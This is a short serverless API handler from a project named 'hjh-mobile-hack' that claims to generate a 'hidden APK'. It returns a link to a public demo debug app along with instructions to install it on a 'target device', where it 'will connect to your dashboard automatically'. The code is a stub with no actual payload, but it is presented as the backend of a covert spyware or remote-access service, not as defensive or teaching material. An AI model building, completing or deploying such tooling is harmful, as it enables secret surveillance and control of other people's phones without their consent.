// api/generate-hidden-apk.js
export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // For testing: GET request shows API is working
  if (req.method === 'GET') {
    return res.status(200).json({
      status: 'API is working',
      endpoint: '/api/generate-hidden-apk',
      method: 'POST',
      timestamp: new Date().toISOString(),
      project: 'hjh-mobile-hack'
    });
  }
  
  // Only allow POST for actual APK generation
  if (req.method !== 'POST') {
    return res.status(405).json({
      error: 'Method not allowed. Use POST.',
      supported_methods: ['POST', 'GET', 'OPTIONS'],
      timestamp: new Date().toISOString()
    });
  }
  
  try {
    // Parse request body
    let config;
    try {
      config = req.body;
    } catch (error) {
      return res.status(400).json({
        success: false,
        error: 'Invalid JSON in request body',
        timestamp: new Date().toISOString()
      });
    }
    
    // Generate unique APK ID
    const apkId = `hjh_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Create response
    const response = {
      success: true,
      apk_id: apkId,
      download_url: 'https://github.com/learning-zone/Android-APK-files/raw/master/app-debug.apk',
      message: 'Hidden APK generated successfully!',
      server: 'Vercel Node.js 24',
      timestamp: new Date().toISOString(),
      config_received: config,
      instructions: 'Install this APK on target device. It will connect to your dashboard automatically.',
      note: 'This is a demo APK. For production, implement proper APK building.'
    };
    
    console.log(`APK generated: ${apkId} for user: ${config.user_id || 'unknown'}`);
    
    return res.status(200).json(response);
    
  } catch (error) {
    console.error('Server error:', error);
    
    return res.status(500).json({
      success: false,
      error: error.message,
      timestamp: new Date().toISOString(),
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
      }
